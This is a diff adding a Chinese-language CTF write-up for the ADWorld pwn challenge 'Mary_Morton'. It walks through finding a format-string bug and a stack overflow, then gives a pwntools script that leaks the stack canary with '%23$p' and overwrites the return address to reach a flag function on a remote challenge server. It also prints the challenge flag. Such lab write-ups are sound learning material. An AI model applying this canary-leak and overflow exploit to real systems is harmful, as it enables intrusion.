@@ -790,6 +790,56 @@ io.interactive()
 
 ------
 
+### [Mary_Morton](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4979)
+
+先`file ./Mary_Morton`查看文件类型再`checksec --file=Mary_Morton`检查一下文件保护情况。`Canary found`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/1.png)
+
+用`IDA Pro 64bit`打开附件`Mary_Morton`，按`F5`反汇编源码并查看主函数。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/2.png)
+
+双击`sub_4009FF()`函数查看详情。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/3.png)
+
+双击`sub_4009DA()`函数查看详情。通过观察主函数后面的代码发现这部分代码并没有骗人，输入`1`确实可以看到栈溢出漏洞，输入`2`确实存在格式化字符串漏洞。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/4.png)
+
+双击`sub_4008EB()`函数查看详情，我们可以利用该函数的格式化漏洞来泄露出`canary`的值。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/5.png)
+
+双击`sub_400960()`函数查看详情，我们可以利用该函数的栈溢出漏洞来让程序执行后门函数从而拿到`flag`。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/6.png)
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/7.png)
+
+编写`Python`代码即可得到`cyberpeace{2b62375defc58c432dee9e3903b48022}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('111.200.241.244', 51303)
+io.sendlineafter(b'3. Exit the battle', b'2')
+io.sendline(b'%23$p')
+io.recvuntil(b'0x')
+canary = int(io.recv(16), 16)
+flag_addr = 0x4008da
+io.sendlineafter(b'3. Exit the battle', b'1')
+payload = b'a'*0x88 + p64(canary) + b'a'*8 + p64(flag_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4979/8.png)
+
+------
+
 
 
 ## CTFShow
